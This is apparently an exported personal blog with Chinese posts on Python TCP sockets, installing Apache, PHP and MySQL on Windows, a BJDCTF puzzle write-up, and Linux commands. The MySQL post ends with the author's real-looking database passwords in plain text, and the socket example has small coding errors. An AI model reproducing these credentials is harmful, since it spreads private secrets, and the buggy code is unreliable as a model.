<h2 id="基于传输层协议的套接字编程"><a href="#基于传输层协议的套接字编程" class="headerlink" title="基于传输层协议的套接字编程"></a>基于传输层协议的套接字编程</h2><p>套接字是一套c语言写成的应用程序开发库，主要用于实现进程间通信和网路编程。实际开发使用套接字分为三类：流套接字（TCP套接字）、数据报套接字和原始套接字。</p>
<h3 id="TCP套接字"><a href="#TCP套接字" class="headerlink" title="TCP套接字"></a>TCP套接字</h3><p>TCP套接字就是使用TCP协议提供的传输服务来实现网络通信的编程接口。<br>下面代码实现一个提供日期的服务器<br><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket import socket,SOCK_STREAM,AF_INET</span><br><span class="line"><span class="keyword">from</span> datetime import datetime</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    <span class="meta"># 1.创建套接字对象并指定使用哪种传输服务</span></span><br><span class="line">    <span class="meta"># family = AF_INET - IPv4地址</span></span><br><span class="line">    <span class="meta"># family = AF_INET5 - IPv6地址</span></span><br><span class="line">    <span class="meta"># type = SOCK_STREAM - TCP套接字</span></span><br><span class="line">    <span class="meta"># type = SOCK_DGRAM - UDP套接字</span></span><br><span class="line">    <span class="meta"># type = SOCK_RAW - 原始套接字</span></span><br><span class="line">    <span class="keyword">server</span> = socket(family=AF_INET,type=SOCK_STREAM)</span><br><span class="line">    <span class="meta"># 2.绑定IP地址和端口（端口用于区分不同的服务器）</span></span><br><span class="line">    <span class="meta"># 同一时间在同一个端口上只能绑定一个服务否则报错</span></span><br><span class="line">    <span class="keyword">server</span>.bind(<span class="string">&#x27;192.168.1.2&#x27;</span>,<span class="number">6789</span>)</span><br><span class="line">    <span class="meta"># 3.开启监听 - 监听客户端连接到服务器</span></span><br><span class="line">    <span class="meta"># 参数512可以理解为连接队列的大小</span></span><br><span class="line">    <span class="keyword">server</span>.listen(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="meta"># 4.通过循环接收客户端的连接并作出相应的处理（提供服务）</span></span><br><span class="line">        <span class="meta"># accept方法是一个阻塞方法如果没有客户端连接到服务器代码不会向下执行</span></span><br><span class="line">        <span class="meta"># accept方法返回一个元组其中的第一个元素是客户端对象</span></span><br><span class="line">        <span class="meta"># 第二个元素是连接到服务器的客户端的地址(由IP和端口两部分构成)</span></span><br><span class="line">        <span class="keyword">client</span>,addr = <span class="keyword">server</span>.accept()</span><br><span class="line">        <span class="keyword">print</span>(<span class="built_in">str</span>(addr) + <span class="string">&#x27;连接到了服务器.&#x27;</span>)</span><br><span class="line">        <span class="meta"># 5.发送数据</span></span><br><span class="line">        <span class="keyword">client</span>.send(<span class="built_in">str</span>(datetime.now()).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="meta"># 6.断开连接</span></span><br><span class="line">        <span class="keyword">client</span>.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>Python-100days</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache PHP MySQL安装配置</title>
    <url>/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="本文为Apache-PHP-MySQL的安装配置总结。"><a href="#本文为Apache-PHP-MySQL的安装配置总结。" class="headerlink" title="本文为Apache PHP MySQL的安装配置总结。"></a>本文为Apache PHP MySQL的安装配置总结。</h3><span id="more"></span>
<h4 id="安装Apache"><a href="#安装Apache" class="headerlink" title="安装Apache"></a>安装Apache</h4><h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><p>从Apache官网下载安装包<br>地址：<a href="https://httpd.apache.org/docs/current/platform/windows.html">https://httpd.apache.org/docs/current/platform/windows.html</a></p>
<p><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/01.png" alt="fae813d878164ac1c2cb18ee88b34665.png"></p>
<h5 id="解压安装"><a href="#解压安装" class="headerlink" title="解压安装"></a>解压安装</h5><p>记住解压路径<br>用管理员身份运行cmd<br>进入安装目录bin文件夹下，执行一下代码<br>安装：</p>
<blockquote>
<p>httpd.exe -k install -n “Apache”</p>
</blockquote>
<p>然后输入</p>
<blockquote>
<p>httpd.exe -t</p>
</blockquote>
<p>查看配置文件<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/02.png" alt="4ce21506a0aefc3decf97453f63ba335.png"><br>如果是这样的则成功<br>不是的话，需要配置conf/httpd.conf<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/03.png" alt="a473f2e9d9688c8802cf0622d49e1a4f.png"><br>配置完再输入httpd.exe -t 查看配置是否好</p>
<h5 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h5><p>这里改一下监听端口号<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/04.png" alt="de1179b9c7922ea0a830923cd359b0e8.png"><br>如果apache不能启动，<br>443端口占用，则改一下文件。conf/extra/httpd-ahssl.conf<br>改为442端口<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/05.png" alt="81b7191c9ae08537971f68dd50b9ba1d.png"><br>启动服务：</p>
<blockquote>
<p>net start Apache<br>重新启动：<br>net restart Apache<br>停止服务<br>net stop Apache</p>
</blockquote>
<p>由于改成了81端口，所以浏览器输入localhost:81，即可看见运行结果。</p>
<h5 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h5><blockquote>
<p>httpd.exe -k uninstall -n “Apache”</p>
</blockquote>
<h4 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h4><h5 id="下载PHP压缩包"><a href="#下载PHP压缩包" class="headerlink" title="下载PHP压缩包"></a>下载PHP压缩包</h5><p>下载地址：<br><a href="https://windows.php.net/download/">https://windows.php.net/download/</a></p>
<p>下载VC15 x64 Thread Safe下的zip压缩包，并且解压到想要安装的目录下。</p>
<h5 id="配置Apache支持PHP解析"><a href="#配置Apache支持PHP解析" class="headerlink" title="配置Apache支持PHP解析"></a>配置Apache支持PHP解析</h5><p>打开Apache配置文件，Apache24/conf/httpd.conf<br>在一堆#LoadModule最下方加上</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#加载PHP</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">LoadModule</span></span> php<span class="number">7</span>_module &#x27;D:/server/php<span class="number">7</span>/php<span class="number">7</span>apache<span class="number">2</span>_<span class="number">4</span>.dll&#x27;</span><br><span class="line"><span class="comment">#加载PHP配置</span></span><br><span class="line"><span class="attribute">PHPIniDir</span> &#x27;D:/server/php<span class="number">7</span>&#x27;</span><br><span class="line"><span class="comment">#分配给PHP</span></span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .php .html .htm</span><br></pre></td></tr></table></figure>
<p>说明：LoadModule是加载模块关键字，php7_module是模块名，C:/PHP7/php7apache2_4.dll是Apache支持PHP解析的dll库文件</p>
<p>PHPIniDir是配置文件目录关键字，’C:/PHP7’是php.ini文件所在目录，此配置实现重启Apache，php的配置同时生效。</p>
<p>AddType关键字添加解析类型，application/x-httpd-php .php表示所有以.php结尾的文件都会使用php解析。</p>
<h5 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h5><p>先写一个index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>保存到Aapche24的htdocs目录下<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/06.png" alt="fac7d760c2cde8a4fc8383d1584dd631.png"><br>运行Apche服务，输入localhost:81/index.php</p>
<p><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/07.png" alt="08c99e9c03dcf20656e1fbb7a4d29b9b.png"><br>可以看到配置成功</p>
<h4 id="安装MySql"><a href="#安装MySql" class="headerlink" title="安装MySql"></a>安装MySql</h4><p>B站视频<br><a href="https://www.bilibili.com/video/av90016352/?spm_id_from=333.788.b_636f6d6d656e74.9">https://www.bilibili.com/video/av90016352/?spm_id_from=333.788.b_636f6d6d656e74.9</a><br>视频讲的非常细。<br>本文链接<a href="https://www.cnblogs.com/honeynan/p/12408119.html">https://www.cnblogs.com/honeynan/p/12408119.html</a><br><a href="https://www.jb51.net/article/179326.htm">https://www.jb51.net/article/179326.htm</a></p>
<h5 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h5><p>下载地址：</p>
<p><a href="https://dev.mysql.com/downloads/installer/">https://dev.mysql.com/downloads/installer/</a></p>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>双击安装包，进行安装<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/08.png" alt="9bbdd5fa383a0c6e5aaa42d7ee8173cb.png"><br>之后一直next，或者execute、finish就行<br>下面到了最为关键的步骤 ，现在、马上、立刻，拿一支笔、拿一个笔记本（不是随便一张纸）！！！下面的东西需要记。<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/09.png" alt="7f2181ee01ebdef60377c3a06dd68aa6.png"></p>
<p>如图所示Port（端口号）后边有黄色惊叹号，说明当前默认的端口号被占用，需要更换端口号。</p>
<p><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/10.png" alt="93413f99729f79bb3b2f5a5e0678dac1.png"></p>
<p>如图所示，可更换为3303，切记！更换后的端口号一定要牢记，最好整理到常用的笔记本上。记录好之后，单机NEXT，NEXT。<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/11.png" alt="915c0c94e183826e7beab433e04bc933.png"></p>
<p>接下来同样相当重要，为你的root用户设置密码，设置密码时一定要先把要设置的密码记录下来，再输入。　　　　<br>密码设置成功后，可以选择添加用户，也可以等待安装成功后再添加。<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/12.png" alt="815996a5c3e320c20e9ca1f717a2659e.png"><br>可以修改服务名，一般默认，点Next<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/13.png" alt="0dce8c164a04bd3bd6a6c933d740c99c.png"></p>
<p>Excute-&gt;NEXT-&gt;Finish-&gt;NEXT-&gt;Finish。<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/14.png" alt="30759c576eab18e76d205d76150a681b.png"></p>
<h5 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h5><p>一般在c盘programfile里边mysql，mysql server 8.0的bin文件夹，把这个文件夹加到path路径<br>最后添加配置文件<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/15.png" alt="dd021ce3e54c94b050fd9f42fcdce233.png"><br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/16.png" alt="24a9bee4141fc6c8dc1a9a029856c270.png"><br>如果没有那个my.ini文件，得新建配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="comment"># 设置3306端口</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">3306</span></span><br><span class="line"><span class="comment"># 设置mysql的安装目录</span></span><br><span class="line"><span class="attr">basedir</span>=C:\Program Files\MySQL</span><br><span class="line"><span class="comment"># 设置mysql数据库的数据的存放目录</span></span><br><span class="line"><span class="attr">datadir</span>=C:\Program Files\MySQL\Data</span><br><span class="line"><span class="comment"># 允许最大连接数</span></span><br><span class="line"><span class="attr">max_connections</span>=<span class="number">200</span></span><br><span class="line"><span class="comment"># 允许连接失败的次数。</span></span><br><span class="line"><span class="attr">max_connect_errors</span>=<span class="number">10</span></span><br><span class="line"><span class="comment"># 服务端使用的字符集默认为UTF8</span></span><br><span class="line"><span class="attr">character-set-server</span>=utf8</span><br><span class="line"><span class="comment"># 创建新表时将使用的默认存储引擎</span></span><br><span class="line"><span class="attr">default-storage-engine</span>=INNODB</span><br><span class="line"><span class="comment"># 默认使用“mysql_native_password”插件认证</span></span><br><span class="line"><span class="comment">#mysql_native_password</span></span><br><span class="line"><span class="attr">default_authentication_plugin</span>=mysql_native_password</span><br><span class="line"><span class="section">[mysql]</span></span><br><span class="line"><span class="comment"># 设置mysql客户端默认字符集</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8</span><br><span class="line"><span class="section">[client]</span></span><br><span class="line"><span class="comment"># 设置mysql客户端连接服务端时默认使用的端口</span></span><br><span class="line"><span class="attr">port</span>=<span class="number">3306</span></span><br><span class="line"><span class="attr">default-character-set</span>=utf8</span><br></pre></td></tr></table></figure>
<p>保存文件为my.ini</p>
<p>以管理员身份运行命令提示符（即：cmd）,进入mysql安装目录，输入mysqld —initialize —console，9P0gYk-?0,kT就是初始密码，一定要记录。<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/17.png" alt="32c9b7579832abece521cd30dd7704ad.png"></p>
<p>继续在命令行中输入mysqld —install，如果出现 Service successfully installed.即为成功！<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/18.png" alt="713357933579e641187568091bb23b96.png"></p>
<p>如果出现以下内容，需要删除原有服务。<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/19.png" alt="f2da3a64d75ac392e2a3b29d639939d6.png"></p>
<p>删除原有服务需要在命令行中输入：sc delete mysql。　　<br>之后再次输入：mysqld —install。</p>
<p>mysql服务安装成功后，需要启动服务。在命令行中输入：net start mysql 。<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/20.png" alt="e5ad7930e0283529225d166988df2559.png"><br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/21.png" alt="e5ad7930e0283529225d166988df2559.png"></p>
<p>到此，mysql数据库全部安装、配置完毕，可以正常使用了！　　<br>登录mysql，在命令行中输入：mysql -uroot -p 回车，输入root密码。也可以使用用户登录，将root改为你自己的用户名即可。　　</p>
<p>注！ -p后边可以直接跟密码吗？可以！但是这样会让你的数据库密码暴露出来，所以建议大家以后先回车，再输入密码，mysql会为你隐藏密码。</p>
<p><strong>登录时如果出现如图所示的情况：</strong><br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/22.png" alt="c9b6176840d71c0bd896242bd2bd5039.png"></p>
<p>在输入密码的时候输入初始密码：<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/23.png" alt="a7a55fca2f1f377dce8c3cea67ba8161.png"></p>
<p>登录成功后，在操作数据库的时候会报以下错误：</p>
<blockquote>
<p>ERROR 1820 (HY000): You must reset your password using ALTER USER statement before executing this statement.</p>
</blockquote>
<p>这是因为此时你的密码时初始密码，你需要先修改密码才可以继续操作。　　修改密码如下：</p>
<blockquote>
<p>alter user ‘root’@’localhost’ identified by ‘123456’;</p>
</blockquote>
<p>最后的“123456”替换为你想要设置的密码，切记不要设置为纯数字或者纯密码，密码太简单也会报错。　　修改完之后，提示OK，说明修改成功！<br><img src="/2020/03/17/Apache-PHP-MySQL%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/24.png" alt="e36d06b8932c0f8573e39dbdd3ccd955.png"></p>
<p>PS：如果当登录时出现无法登录的情况或者忘记root密码（请先检查mysql服务是否已开启），请看一下文章</p>
<p><a href="https://www.cnblogs.com/honeynan/p/12408144.html">https://www.cnblogs.com/honeynan/p/12408144.html</a></p>
<p>root密码 root</p>
<p>root@localhost密码PXz8s+quq8&gt;k</p>
]]></content>
      <categories>
        <category>软件安装</category>
      </categories>
      <tags>
        <tag>软件安装</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF 2nd</title>
    <url>/2020/03/25/BJDCTF-2nd/</url>
    <content><![CDATA[<p>这次跟着去水了一把。平常也练了一些，但见到这些题，也只能说是见识面太窄，还是慢慢积累吧。以下是部分wp，慢慢学慢慢更。</p>
<span id="more"></span>
<p><a href="https://buuoj.cn/challenges">题目地址</a></p>
<h3 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h3><p>QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==<br>直接base64解码得到falg</p>
<h3 id="老文盲了1"><a href="#老文盲了1" class="headerlink" title="老文盲了1"></a>老文盲了1</h3><p>附件下载完打开是一行生僻字，</p>
<blockquote>
<p>罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</p>
</blockquote>
<p>着实是无头绪，在后来hint的提示下，知道是读音。然后一个一个百度，连起来读一下知道flag。</p>
<blockquote>
<p>bi ji di da kuo hao zhe jiu shi fu lai ge zhi jie jiao le ba da guo hao</p>
</blockquote>
<h3 id="A-beautiful-picture"><a href="#A-beautiful-picture" class="headerlink" title="A beautiful picture"></a>A beautiful picture</h3><p><img src="/2020/03/25/BJDCTF-2nd/01.png" alt="picture"></p>
<p>这个就是标准隐写了，打开WinHex，改一下图片的高度，改到最大。<br><img src="/2020/03/25/BJDCTF-2nd/02.png" alt="picture"></p>
<p>然后得到flag。<br><img src="/2020/03/25/BJDCTF-2nd/03.png" alt="picture"></p>
<h3 id="灵能精通"><a href="#灵能精通" class="headerlink" title="灵能精通"></a>灵能精通</h3><p>这个题是猪圈密码的变形，可以根据提米描述，然后查一下这段话可以知道是圣堂武士密码。</p>
<p><img src="/2020/03/25/BJDCTF-2nd/04.png" alt="picture"></p>
<p><img src="/2020/03/25/BJDCTF-2nd/05.png" alt="picture"><br><img src="/2020/03/25/BJDCTF-2nd/06.png" alt="picture"></p>
<h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>给的是一串字符串，直接hex转string：得到yanzi ZJQ{xilzv_iqssuhoc_suzjg}<br><img src="/2020/03/25/BJDCTF-2nd/07.png" alt="picture"><br>然后就是换位密码，试过不是栅栏，从网上得知是维吉尼亚密码。yanzi是key。接下来就是解密了。</p>
<p><img src="/2020/03/25/BJDCTF-2nd/08.png" alt="picture"></p>
<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><p>这个是根据图中只有两种形态，想到二进制，鸡腿为1，然后二进制转字符串。<br><img src="/2020/03/25/BJDCTF-2nd/09.png" alt="picture"></p>
<h3 id="小姐姐"><a href="#小姐姐" class="headerlink" title="小姐姐"></a>小姐姐</h3><p>压缩包直接解压缩得到图片，然后用winhex打开，搜BJD得到flag。<br><img src="/2020/03/25/BJDCTF-2nd/10.png" alt="picture"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux基础命令</title>
    <url>/2020/02/12/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><p>【语句格式】</p>
<blockquote>
<p>命令名称  [命令参数] [命令对象]</p>
</blockquote>
<span id="more"></span>
<h3 id="1-获取登录信息-w-who-last-lastb"><a href="#1-获取登录信息-w-who-last-lastb" class="headerlink" title="1.获取登录信息 - w/who/last/lastb"></a>1.获取登录信息 - <strong>w/who/last/lastb</strong></h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">admintor</span>@admintor-PC:~/Desktop$ w</span><br><span class="line"> <span class="attribute">12</span>:<span class="number">32</span>:<span class="number">22</span> up  <span class="number">2</span>:<span class="number">57</span>,  <span class="number">1</span> user,  load average: <span class="number">0</span>.<span class="number">86</span>, <span class="number">1</span>.<span class="number">18</span>, <span class="number">1</span>.<span class="number">13</span></span><br><span class="line"><span class="attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">admintor</span> tty<span class="number">1</span>     :<span class="number">0</span>               <span class="number">09</span>:<span class="number">35</span>    <span class="number">2</span>:<span class="number">57</span>m  <span class="number">4</span>:<span class="number">45</span>  <span class="number">11</span>.<span class="number">21</span>s /usr/bin/startdde</span><br><span class="line"><span class="attribute">admintor</span>@admintor-PC:~/Desktop$ clear</span><br><span class="line"></span><br><span class="line"><span class="attribute">admintor</span>@admintor-PC:~/Desktop$ w</span><br><span class="line"> <span class="attribute">12</span>:<span class="number">32</span>:<span class="number">28</span> up  <span class="number">2</span>:<span class="number">57</span>,  <span class="number">1</span> user,  load average: <span class="number">0</span>.<span class="number">79</span>, <span class="number">1</span>.<span class="number">16</span>, <span class="number">1</span>.<span class="number">13</span></span><br><span class="line"><span class="attribute">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">admintor</span> tty<span class="number">1</span>     :<span class="number">0</span>               <span class="number">09</span>:<span class="number">35</span>    <span class="number">2</span>:<span class="number">57</span>m  <span class="number">4</span>:<span class="number">45</span>  <span class="number">11</span>.<span class="number">21</span>s /usr/bin/startdde</span><br><span class="line"><span class="attribute">admintor</span>@admintor-PC:~/Desktop$ who</span><br><span class="line"><span class="attribute">admintor</span> tty<span class="number">1</span>         <span class="number">2020</span>-<span class="number">02</span>-<span class="number">08</span> <span class="number">09</span>:<span class="number">35</span> (:<span class="number">0</span>)</span><br><span class="line"><span class="attribute">admintor</span>@admintor-PC:~/Desktop$ whoami</span><br><span class="line"><span class="attribute">admintor</span></span><br><span class="line"><span class="attribute">admintor</span>@admintor-PC:~/Desktop$ last</span><br><span class="line"><span class="attribute">admintor</span> tty<span class="number">1</span>         :<span class="number">0</span>               Sat Feb  <span class="number">8</span> <span class="number">09</span>:<span class="number">35</span>   still logged in</span><br><span class="line"><span class="attribute">reboot</span>   system boot  <span class="number">4</span>.<span class="number">15</span>.<span class="number">0</span>-<span class="number">30</span>deepin- Sat Feb  <span class="number">8</span> <span class="number">17</span>:<span class="number">34</span>   still running</span><br><span class="line"><span class="attribute">admintor</span> tty<span class="number">1</span>         :<span class="number">0</span>               Fri Feb  <span class="number">7</span> <span class="number">11</span>:<span class="number">43</span> - <span class="number">18</span>:<span class="number">32</span>  (<span class="number">06</span>:<span class="number">49</span>)</span><br><span class="line"><span class="attribute">reboot</span>   system boot  <span class="number">4</span>.<span class="number">15</span>.<span class="number">0</span>-<span class="number">30</span>deepin- Fri Feb  <span class="number">7</span> <span class="number">19</span>:<span class="number">42</span> - <span class="number">18</span>:<span class="number">32</span>  (-<span class="number">1</span>:-<span class="number">9</span>)</span><br><span class="line"><span class="attribute">admintor</span> tty<span class="number">1</span>         :<span class="number">0</span>               Wed Feb  <span class="number">5</span> <span class="number">10</span>:<span class="number">21</span> - <span class="number">14</span>:<span class="number">43</span>  (<span class="number">04</span>:<span class="number">21</span>)</span><br><span class="line"><span class="attribute">reboot</span>   system boot  <span class="number">4</span>.<span class="number">15</span>.<span class="number">0</span>-<span class="number">30</span>deepin- Wed Feb  <span class="number">5</span> <span class="number">18</span>:<span class="number">19</span> - <span class="number">14</span>:<span class="number">43</span>  (-<span class="number">3</span>:-<span class="number">36</span>)</span><br><span class="line"><span class="attribute">admintor</span> tty<span class="number">1</span>         :<span class="number">0</span>               Tue Feb  <span class="number">4</span> <span class="number">09</span>:<span class="number">32</span> - <span class="number">18</span>:<span class="number">16</span>  (<span class="number">08</span>:<span class="number">44</span>)</span><br><span class="line"><span class="attribute">reboot</span>   system boot  <span class="number">4</span>.<span class="number">15</span>.<span class="number">0</span>-<span class="number">30</span>deepin- Tue Feb  <span class="number">4</span> <span class="number">17</span>:<span class="number">31</span> - <span class="number">18</span>:<span class="number">17</span>  (<span class="number">00</span>:<span class="number">45</span>)</span><br><span class="line"><span class="attribute">admintor</span> tty<span class="number">1</span>         :<span class="number">0</span>               </span><br></pre></td></tr></table></figure>
<h3 id="2-查看自己使用的Shell-ps"><a href="#2-查看自己使用的Shell-ps" class="headerlink" title="2.查看自己使用的Shell - ps"></a>2.查看自己使用的Shell - <strong>ps</strong></h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">admintor</span>@admintor-PC:~/Desktop$ ps</span><br><span class="line">  <span class="attribute">PID</span> TTY          TIME CMD</span><br><span class="line"><span class="attribute">19593</span> pts/<span class="number">1</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> bash</span><br><span class="line"><span class="attribute">20057</span> pts/<span class="number">1</span>    <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> ps</span><br></pre></td></tr></table></figure>
<h3 id="3-查看命令的说明和位置-whatis-which-whereis"><a href="#3-查看命令的说明和位置-whatis-which-whereis" class="headerlink" title="3.查看命令的说明和位置 - whatis/which/whereis"></a>3.查看命令的说明和位置 - <strong>whatis/which/whereis</strong></h3><h4 id="whatis"><a href="#whatis" class="headerlink" title="whatis"></a>whatis</h4><p>【功能】在whatis库中搜寻特定的命令 </p>
<p>【语法】whatis COMMAND</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">admintor@admintor-PC:~/Desktop$ whatis <span class="keyword">ps</span></span><br><span class="line"><span class="keyword">ps</span> (<span class="number">1</span>)               - report <span class="keyword">a</span> snapshot of the current processes.</span><br><span class="line">admintor@admintor-PC:~/Desktop$ whatis <span class="keyword">python</span></span><br><span class="line"><span class="keyword">python3</span>.<span class="number">7</span> (<span class="number">1</span>)        - <span class="keyword">an</span> interpreted, interactive, object-oriented programming <span class="keyword">language</span></span><br><span class="line"><span class="keyword">python</span> (<span class="number">1</span>)           - <span class="keyword">an</span> interpreted, interactive, object-oriented programming <span class="keyword">language</span></span><br></pre></td></tr></table></figure>
<h4 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h4><p>【功能】 查找文件、手册页、命令等的相关位置</p>
<p>【语法】 whereis options argument</p>
<p>【常用选项】 </p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-b:只查找二进制文件位置</span></span><br><span class="line"><span class="deletion">-m:只查找手册页部分</span></span><br></pre></td></tr></table></figure>
<p>【实例】<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">admintor@admintor-PC:~/Desktop$ whereis ps</span><br><span class="line">ps: <span class="regexp">/usr/</span>bin<span class="regexp">/ps /u</span>sr<span class="regexp">/share/m</span>an<span class="regexp">/man1/</span>ps.<span class="number">1</span>.gz</span><br><span class="line">admintor@admintor-PC:~/Desktop$ whereis python</span><br><span class="line">python: <span class="regexp">/usr/</span>bin<span class="regexp">/python /u</span>sr<span class="regexp">/bin/</span>python2.<span class="number">7</span>-config <span class="regexp">/usr/</span>bin<span class="regexp">/python3.5-dbg /u</span>sr<span class="regexp">/bin/</span>python2.<span class="number">7</span> <span class="regexp">/usr/</span>bin<span class="regexp">/python3.5dm-config /u</span>sr<span class="regexp">/bin/</span>python3.<span class="number">5</span> <span class="regexp">/usr/</span>bin<span class="regexp">/python3.5m /u</span>sr<span class="regexp">/bin/</span>python3.<span class="number">5</span>dm <span class="regexp">/usr/</span>bin<span class="regexp">/python3.5-dbg-config /u</span>sr<span class="regexp">/lib/</span>python2.<span class="number">7</span> <span class="regexp">/usr/</span>lib<span class="regexp">/python3.5 /</span>etc<span class="regexp">/python /</span>etc<span class="regexp">/python2.7 /</span>etc<span class="regexp">/python3.5 /u</span>sr<span class="regexp">/local/</span>bin<span class="regexp">/python3.7 /u</span>sr<span class="regexp">/local/</span>bin<span class="regexp">/python3.7m /u</span>sr<span class="regexp">/local/</span>bin<span class="regexp">/python3.7m-config /u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/python3.7 /u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/python2.7 /u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/python3.5 /u</span>sr<span class="regexp">/include/</span>python2.<span class="number">7</span> <span class="regexp">/usr/i</span>nclude<span class="regexp">/python3.5m /u</span>sr<span class="regexp">/include/</span>python3.<span class="number">5</span>dm <span class="regexp">/usr/</span>share<span class="regexp">/python /u</span>sr<span class="regexp">/share/m</span>an<span class="regexp">/man1/</span>python.<span class="number">1</span>.gz</span><br></pre></td></tr></table></figure></p>
<h4 id="which"><a href="#which" class="headerlink" title="which"></a>which</h4><p>【功能】 查看<strong>可执行命令</strong>的路径</p>
